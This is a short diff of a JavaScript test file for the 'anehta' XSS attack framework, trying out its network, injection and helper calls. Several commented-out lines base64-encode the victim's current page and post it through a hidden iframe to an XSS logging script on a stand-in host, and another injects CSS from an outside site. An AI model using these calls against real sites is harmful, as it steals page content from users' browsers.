@@ -14,18 +14,23 @@
 
 //if (typeof document.styleSheetSets != "undefined") {alert(document.styleSheetSets);}
 
-//anehta.net.cssGet("http://www.baidu.com");
+//anehta.net.cssGet("http://www.xiaonei.com");
+
+//anehta.inject.injectCSS("http://www.google.cn");
 
 //var sss = anehta.crypto.base64Encode(anehta.misc.getCurrentPage());
 
 //var ifr = anehta.inject.addIframe(""); 
-//anehta.net.postFormIntoIframe("http://www.a.com/anehta/logxss.php", sss, ifr);
+//anehta.net.postFormIntoIframe(ifr, "http://www.a.com/anehta/logxss.php", sss);
 
 //alert(document.styleSheets[0].innerHTML);
 
-setTimeout(function(){alert(anehta.misc.getCurrentPage());}, 3000);
 
-alert(anehtaBrowser.type()+" "+anehtaBrowser.version());
+anehta.help('dom');
+
+//setTimeout(function(){alert(anehta.misc.getCurrentPage());}, 4000);
+
+//alert(anehtaBrowser.type()+" "+anehtaBrowser.version());
 
 
 
